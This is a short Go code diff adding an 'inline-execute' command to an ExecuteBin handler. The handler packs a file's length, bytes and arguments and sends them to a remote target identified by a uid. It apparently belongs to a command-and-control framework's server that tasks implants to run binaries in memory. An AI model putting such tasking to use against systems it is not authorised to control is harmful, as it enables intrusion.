@@ -617,6 +617,15 @@ func ExecuteBin(c *gin.Context) {
 		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
 		byteToSend := utils.BytesCombine(cmdTypeBytes, fileBytes)
 		sendcommand.SendFileUploadCommand(uid, byteToSend)
+	case "inline-execute":
+		fileLength := len(fileBytes)
+		fileLengthBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
+		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
+		cmdTypeBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineExecute))
+		byteToSend = append(cmdTypeBytes, byteToSend...)
+		sendcommand.SendFileUploadCommand(uid, byteToSend)
 	}
 
 }
